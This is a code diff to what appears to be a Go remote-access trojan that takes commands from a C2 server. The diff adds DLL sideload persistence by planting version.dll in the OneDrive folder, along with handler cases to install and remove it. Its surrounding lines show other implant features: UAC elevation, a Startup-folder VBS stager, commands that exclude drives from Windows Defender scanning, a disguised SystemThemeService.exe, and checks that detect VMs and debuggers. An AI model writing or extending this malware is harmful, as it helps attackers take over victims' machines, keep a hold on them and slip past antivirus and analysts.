@@ -1654,7 +1654,10 @@ func removePersistence() string {
 	regDelete(HKCU, `Software\Microsoft\Windows\CurrentVersion\Run`, "Finder")
 	legacyPath := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Themes\SystemThemeService.exe`)
 	os.Remove(legacyPath)
-	return "Persistence removed"
+	// Clean up DLL sideload if present
+	sideloadPath := filepath.Join(os.Getenv("LOCALAPPDATA"), `Microsoft\OneDrive\version.dll`)
+	os.Remove(sideloadPath)
+	return "Persistence removed (startup + sideload)"
 }
 
 // ================================================================
@@ -1979,7 +1982,9 @@ SYSTEM
   isadmin        - Check if session is admin
   elevate        - Attempt UAC elevation
   persist        - Add persistence (Startup folder VBS stager)
-  unpersist      - Remove persistence
+  unpersist      - Remove persistence (startup + sideload)
+  sideload       - Install DLL sideload persistence (OneDrive)
+  unsideload     - Remove DLL sideload persistence
   excludec       - Exclude C:\ from Defender scans
   excludeall     - Exclude C:\ through G:\ from Defender
   enableio       - Enable keyboard/mouse (admin)
@@ -2070,6 +2075,12 @@ func handleCommand(c2 *C2Client, jm *JobManager, cmd Command) {
 
 	case "unpersist", "removepersistance":
 		result = removePersistence()
+
+	case "sideload":
+		result = installSideload()
+
+	case "unsideload":
+		result = uninstallSideload()
 
 	case "excludec", "excludecdrive":
 		result = excludeDrive([]string{`C:\`})
@@ -2337,7 +2348,7 @@ func jitteredSleep(base time.Duration, jitterPct int) {
 // MAIN
 // ================================================================
 
-func main() {
+func runAgent() {
 	// Anti-analysis: exit if non-VMware VM or debugger detected.
 	// VMware-only triggers are treated as false positives (host has VMware installed).
 	vmDetected, vmTriggers := detectVMDetails()
